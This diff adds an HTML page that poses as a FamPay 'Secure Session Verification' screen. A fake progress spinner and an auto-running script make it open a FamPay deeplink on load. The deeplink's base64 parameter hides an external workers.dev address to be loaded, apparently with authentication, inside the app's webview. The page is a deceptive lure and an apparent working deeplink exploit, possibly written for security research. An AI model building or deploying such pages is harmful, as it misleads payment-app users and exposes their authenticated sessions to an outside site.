@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FamPay Secure Verification</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+            background: #0d0d0d;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .card {
+            background: #1c1c1c;
+            padding: 25px;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: bold;
+            color: #00d084;
+        }
+
+        .title {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #aaa;
+            margin-top: 10px;
+        }
+
+        .loader {
+            margin: 25px auto;
+            border: 4px solid #333;
+            border-top: 4px solid #00d084;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status {
+            font-size: 14px;
+            color: #00d084;
+        }
+
+        .btn {
+            margin-top: 20px;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            background: #00d084;
+            color: black;
+            font-weight: bold;
+        }
+    </style>
+
+    <script>
+        const DEEPLINK = "fp://fampay.in/home_init/?init_deeplink=aHR0cHM6Ly95YXRoLXNlYy5mYW1hcHAtdWF0LndvcmtlcnMuZGV2Lz9mcF9hdXRoX3JlcT10cnVlJmZwX3R5cGU9ZnBTdXJ2ZXkmZnBfbmV3X3dpbmRvdz10cnVlJnNvdXJjZT1hcHAmcGxhdGZvcm09YW5kcm9pZCZpc1dlYnZpZXc9dHJ1ZQo=";
+
+        function openApp() {
+            document.getElementById("status").innerText = "Opening secure session...";
+            window.location.href = DEEPLINK;
+
+            // fallback if app not opened
+            setTimeout(() => {
+                document.getElementById("status").innerText = "If not redirected, tap below.";
+                document.getElementById("btn").style.display = "block";
+            }, 2000);
+        }
+
+        window.onload = function () {
+            setTimeout(openApp, 1200);
+        };
+    </script>
+
+</head>
+
+<body>
+
+    <div class="card">
+        <div class="logo">FamPay</div>
+
+        <div class="title">🔐 Secure Session Verification</div>
+        <div class="subtitle">Please wait while we verify your account...</div>
+
+        <div class="loader"></div>
+
+        <div id="status" class="status">Initializing...</div>
+
+        <button id="btn" class="btn" style="display:none;" onclick="openApp()">
+            Continue
+        </button>
+    </div>
+
+</body>
+
+</html>
